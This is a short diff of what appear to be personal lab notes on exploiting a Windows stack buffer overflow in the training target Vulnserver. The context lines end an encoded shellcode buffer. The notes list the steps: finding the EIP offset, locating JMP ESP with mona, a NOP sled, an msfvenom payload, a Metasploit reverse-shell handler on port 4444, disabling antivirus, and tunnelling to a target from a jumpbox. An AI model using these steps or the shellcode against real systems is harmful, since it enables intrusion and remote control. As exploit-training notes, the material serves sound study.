@@ -425,17 +425,34 @@ buf += b"\x70\xf0\x18\x8a\x17\x70\xba\x20\xf6\x04\x20\xaa"
 buf += b"\x06\xb2\xfb\xa3\xe6\xf1\x7c"
 
 
+Windows Buffer Overflow
+get VulnSever and essfunc.dll
 
 
 
 
+Create Script with socket input
 
+Open Immunity debugger to see rhe vulnserver exploit 
 
+grab wiremask overflow pattern 
 
+look at the cpu window to grab the eip to find the buffer overflow offset
 
+!mona modules
+- Gives addresses for .dll or Modules
+!mona jmp -r esp -m
+- Gives addresses for JMP ESP 
 
+NO OP Sled "\x90" * 15
+msfvenom a payload
 
+set up multihandler
+use mulyi/handler
 
+LHOST 0.0.0.0
+LPORT 4444
 
+turn off anti virus (realtime protection)
 
-
+change to quad 0's for host and local port to the desired machine after you make a tunnel to the target from the jumpbox 
